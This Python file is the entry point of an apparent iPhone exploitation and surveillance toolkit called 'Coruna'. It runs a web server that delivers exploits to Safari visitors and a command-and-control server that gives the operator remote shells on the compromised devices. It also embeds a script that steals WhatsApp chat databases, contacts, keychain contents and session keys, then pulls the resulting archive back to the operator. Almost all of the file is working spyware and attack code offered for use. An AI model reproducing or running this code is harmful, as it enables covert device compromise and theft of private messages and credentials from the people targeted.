#!/usr/bin/env python3
"""
Entry point - Web server (Coruna exploit) + C2 server.
"""

import asyncio
import os
import signal
import sys
from pathlib import Path

_script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(_script_dir)
if _script_dir not in sys.path:
    sys.path.insert(0, _script_dir)

from core.config_manager import ConfigManager
from web_server.exploit_http_server import ExploiterWebServer
from c2_comms.c2_server import C2Server


async def main():
    config = ConfigManager()
    c2_bind = config.get("c2_bind", "0.0.0.0")
    c2_port = config.get("c2_port", 8080)
    c2_server = C2Server(c2_bind, c2_port)

    web_ip = config.get("web_server_ip", "0.0.0.0")
    web_port = config.get("web_server_port", 80)
    exploits_dir = config.get("exploit_templates_dir", "exploits")
    static_dir = config.get("static_files_dir", "web_server/static")
    web_server = ExploiterWebServer(
        web_ip, web_port, exploits_dir, static_dir, c2_server=c2_server
    )

    await web_server.start(config, c2_server=c2_server)
    c2_task = asyncio.create_task(c2_server.start())

    port_suffix = "" if web_port == 80 else f":{web_port}"
    print(f"\n[*] Coruna running. Open http://<SERVER_IP>{port_suffix}/ in Safari on your iPhone")
    print(f"[*] Operator Dashboard UI: http://127.0.0.1{port_suffix}/ui")
    print("[*] Commands: list | use <id> | waextract <id> | waget <id> | help | quit\n")

    shutdown_event = asyncio.Event()

    def _signal_handler():
        print("\n[*] Shutdown signal received. Stopping servers...")
        shutdown_event.set()

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _signal_handler)
        except (NotImplementedError, RuntimeError):
            pass

    async def run_shell(session):
        """Interactive shell mode for a session."""
        print(f"\n[*] Connected to {session.ip_address} (session {session.id}). Type 'exit' or 'back' to return.\n")
        while not shutdown_event.is_set():
            try:
                cmd = await loop.run_in_executor(None, lambda: input("(shell)> ").strip())
            except (EOFError, KeyboardInterrupt):
                break
            if cmd in ("exit", "back", "quit"):
                print("[*] Returning to main menu.")
                break
            if not cmd:
                continue
            if session.id not in c2_server.active_sessions:
                print("[-] Session terminated.")
                break
            try:
                session.output_buffer.clear()
                await session.send_command(cmd)
                for _ in range(50):
                    await asyncio.sleep(0.1)
                    out = session.get_buffered_output()
                    if out:
                        print(out, end="", flush=True)
            except Exception as e:
                print(f"[-] Error: {e}")
                break

    async def run_whatsapp_extraction(session):
        """Deploy and run WhatsApp data extraction on compromised device."""
        print(f"\n[*] Deploying WhatsApp extractor to {session.ip_address} (session {session.id})...")

        extractor_script = '''
import json, os, plistlib, shutil, sqlite3, subprocess, sys, tarfile, tempfile, time
from pathlib import Path

WHATSAPP_BUNDLE_ID = "net.whatsapp.WhatsApp"
WHATSAPP_BUNDLE_ID_ALT = "net.whatsapp.WhatsApp.ShareExtension"

def log(msg, level="info"):
    prefix = {"info": "[*]", "success": "[+]", "error": "[-]", "warn": "[!]"}.get(level, "[*]")
    print(f"{prefix} {msg}", flush=True)

def find_whatsapp_container():
    base = Path("/var/mobile/Containers/Data/Application")
    if not base.exists():
        log("Application container directory not found", "error")
        return None
    for container in base.iterdir():
        if not container.is_dir():
            continue
        info_plist = container / ".com.apple.mobile_container_manager.metadata.plist"
        if info_plist.exists():
            try:
                with open(info_plist, "rb") as f:
                    meta = plistlib.load(f)
                if meta.get("MCMMetadataIdentifier") in (WHATSAPP_BUNDLE_ID, WHATSAPP_BUNDLE_ID_ALT):
                    log(f"Found WhatsApp container: {container}")
                    return container, meta.get("MCMMetadataIdentifier")
            except Exception as e:
                log(f"Failed to parse {info_plist}: {e}", "warn")
    log("WhatsApp container not found", "error")
    return None, None

def extract_chat_storage(container, output_dir):
    chat_db = container / "Documents" / "ChatStorage.sqlite"
    if not chat_db.exists():
        log("ChatStorage.sqlite not found in Documents/", "error")
        return None
    dest = output_dir / "ChatStorage.sqlite"
    shutil.copy2(chat_db, dest)
    log(f"Extracted ChatStorage.sqlite -> {dest}", "success")
    return dest

def extract_session_keys(container, output_dir):
    keys = []
    keychain_dump = output_dir / "keychain_dump.txt"
    try:
        result = subprocess.run(["security", "dump-keychain", "-d"], capture_output=True, text=True, timeout=30)
        keychain_dump.write_text(result.stdout)
        for line in result.stdout.splitlines():
            if WHATSAPP_BUNDLE_ID in line or "whatsapp" in line.lower():
                keys.append({"source": "keychain", "data": line.strip()})
    except Exception as e:
        log(f"Keychain dump failed: {e}", "warn")
    prefs_dir = container / "Library" / "Preferences"
    if prefs_dir.exists():
        for plist_file in prefs_dir.glob("*.plist"):
            try:
                with open(plist_file, "rb") as f:
                    data = plistlib.load(f)
                if any("session" in str(k).lower() or "key" in str(k).lower() or "auth" in str(k).lower() for k in data.keys()):
                    keys.append({"source": f"preferences/{plist_file.name}", "data": data})
                    log(f"Found potential session data in {plist_file.name}", "success")
            except Exception:
                pass
    return keys

def parse_chat_database(db_path):
    try:
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = [row[0] for row in cursor.fetchall()]
        log(f"Database tables: {tables}")
        contacts = []
        if "ZWACHATSESSION" in tables:
            cursor.execute("SELECT ZPARTNERJID, ZPARTNERNAME, ZPARTNERPUSHNAME FROM ZWACHATSESSION WHERE ZPARTNERJID IS NOT NULL")
            for row in cursor.fetchall():
                contacts.append({"jid": row["ZPARTNERJID"], "name": row["ZPARTNERNAME"], "push_name": row["ZPARTNERPUSHNAME"]})
        messages_count = 0
        if "ZWAMESSAGE" in tables:
            cursor.execute("SELECT COUNT(*) as cnt FROM ZWAMESSAGE")
            messages_count = cursor.fetchone()["cnt"]
        conn.close()
        return {"contacts": contacts, "messages_count": messages_count}
    except Exception as e:
        log(f"Database parsing failed: {e}", "error")
        return {"contacts": [], "messages_count": 0}

def create_archive(output_dir):
    archive_path = output_dir.with_suffix(".tar.gz")
    with tarfile.open(archive_path, "w:gz") as tar:
        for file_path in output_dir.rglob("*"):
            if file_path.is_file():
                tar.add(file_path, arcname=file_path.relative_to(output_dir))
    log(f"Created archive: {archive_path}", "success")
    return archive_path

output_dir = Path(tempfile.mkdtemp(prefix="wa_extract_"))
log("Starting WhatsApp data extraction...")
container, bundle_id = find_whatsapp_container()
if container:
    chat_db = extract_chat_storage(container, output_dir)
    session_keys = extract_session_keys(container, output_dir)
    db_info = parse_chat_database(chat_db) if chat_db else {"contacts": [], "messages_count": 0}
    archive = create_archive(output_dir)
    result = {"bundle_id": bundle_id, "container": str(container), "chat_db": str(chat_db) if chat_db else None,
              "contacts": db_info["contacts"], "messages_count": db_info["messages_count"],
              "session_keys": session_keys, "archive": str(archive)}
    print("__RESULT__" + json.dumps(result, default=str) + "__RESULT__")
else:
    print("__RESULT__" + json.dumps({"error": "WhatsApp not found"}) + "__RESULT__")
'''

        print("[*] Sending extraction script...")
        session.output_buffer.clear()
        await session.send_command(f"python3 -c {repr(extractor_script)}")

        print("[*] Waiting for extraction to complete...")
        result_json = ""
        for _ in range(200):
            await asyncio.sleep(0.5)
            out = session.get_buffered_output()
            if out:
                print(out, end="", flush=True)
                if "__RESULT__" in out:
                    start = out.find("__RESULT__") + 10
                    end = out.find("__RESULT__", start)
                    if end > start:
                        result_json = out[start:end]
                        break

        if result_json:
            try:
                result = json.loads(result_json)
                print("\n=== EXTRACTION RESULT ===")
                print(f"Bundle ID: {result.get('bundle_id')}")
                print(f"Container: {result.get('container')}")
                print(f"Chat DB: {result.get('chat_db')}")
                print(f"Contacts: {len(result.get('contacts', []))}")
                print(f"Messages: {result.get('messages_count')}")
                print(f"Session keys: {len(result.get('session_keys', []))}")
                print(f"Archive: {result.get('archive')}")
                if result.get("contacts"):
                    print("\nTop contacts:")
                    for c in result["contacts"][:10]:
                        print(f"  {c.get('name') or c.get('push_name') or 'Unknown'} - {c.get('jid')}")
            except json.JSONDecodeError:
                print("[-] Failed to parse result")
        else:
            print("[-] No result received (timeout or error)")

        print("[*] To retrieve archive, run on target: cat <archive_path> | base64")

    async def run_retrieve_archive(session):
        """Retrieve a base64-encoded archive from the compromised device."""
        print(f"\n[*] Retrieving archive from {session.ip_address} (session {session.id})...")
        archive_path = input("Archive path on target: ").strip()
        if not archive_path:
            print("[-] No path provided")
            return
        session.output_buffer.clear()
        await session.send_command(f"cat {archive_path} | base64")
        print("[*] Waiting for base64 data...")
        b64_data = ""
        for _ in range(300):
            await asyncio.sleep(0.5)
            out = session.get_buffered_output()
            if out:
                b64_data += out
                if len(b64_data) > 100:
                    print(f"[*] Received {len(b64_data)} chars...", end="\r")
        try:
            import base64
            archive_bytes = base64.b64decode(b64_data.strip())
            local_path = Path(f"whatsapp_extract_{session.id}.tar.gz")
            local_path.write_bytes(archive_bytes)
            print(f"\n[+] Saved archive to {local_path} ({len(archive_bytes)} bytes)")
        except Exception as e:
            print(f"[-] Failed to decode/save: {e}")

    is_headless = os.environ.get("CORUNA_HEADLESS") in ("1", "true", "yes") or not sys.stdin.isatty()
    if is_headless:
        print("[*] Daemon / non-interactive mode active. Web server and C2 waiting for connections...")
        print("[*] Press Ctrl+C or send SIGTERM to stop.\n")
        try:
            await shutdown_event.wait()
        except (asyncio.CancelledError, KeyboardInterrupt):
            pass
    else:
        while not shutdown_event.is_set():
            try:
                cmd = await loop.run_in_executor(None, lambda: input("(coruna)> ").strip().lower())
            except (EOFError, KeyboardInterrupt):
                break
            if cmd in ("quit", "exit"):
                break
            if cmd in ("help", "h", "?"):
                print("  list       List active sessions (IDs)")
                print("  use <id>   Attach to session shell (e.g., use abc12345)")
                print("  waextract <id>  Extract WhatsApp data from session")
                print("  waget <id>      Retrieve base64 archive from session")
                print("  quit       Stop server and exit")
                continue
            if cmd in ("list", "ls", "sessions"):
                for s in c2_server.get_sessions_summary():
                    print(f"  [{s['id']}] {s['ip_address']} {s['connected_at']}")
                if not c2_server.get_sessions_summary():
                    print("  (no active sessions)")
            elif cmd.startswith("use "):
                parts = cmd.split(maxsplit=1)
                sid = parts[1] if len(parts) > 1 else ""
                session = c2_server.get_session_by_id(sid)
                if session:
                    await run_shell(session)
                else:
                    print(f"[-] Session '{sid}' not found. Use 'list' to see IDs.")
            elif cmd == "waextract" or cmd.startswith("waextract "):
                parts = cmd.split(maxsplit=1)
                sid = parts[1] if len(parts) > 1 else ""
                if not sid and len(c2_server.active_sessions) == 1:
                    sid = next(iter(c2_server.active_sessions))
                session = c2_server.get_session_by_id(sid)
                if session:
                    await run_whatsapp_extraction(session)
                else:
                    print(f"[-] Session '{sid}' not found. Usage: waextract <id>")
            elif cmd == "waget" or cmd.startswith("waget "):
                parts = cmd.split(maxsplit=1)
                sid = parts[1] if len(parts) > 1 else ""
                if not sid and len(c2_server.active_sessions) == 1:
                    sid = next(iter(c2_server.active_sessions))
                session = c2_server.get_session_by_id(sid)
                if session:
                    await run_retrieve_archive(session)
                else:
                    print(f"[-] Session '{sid}' not found. Usage: waget <id>")

    c2_task.cancel()
    try:
        await c2_task
    except asyncio.CancelledError:
        pass
    c2_server.stop()
    await web_server.stop()
    print("[*] Servers shut down successfully.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
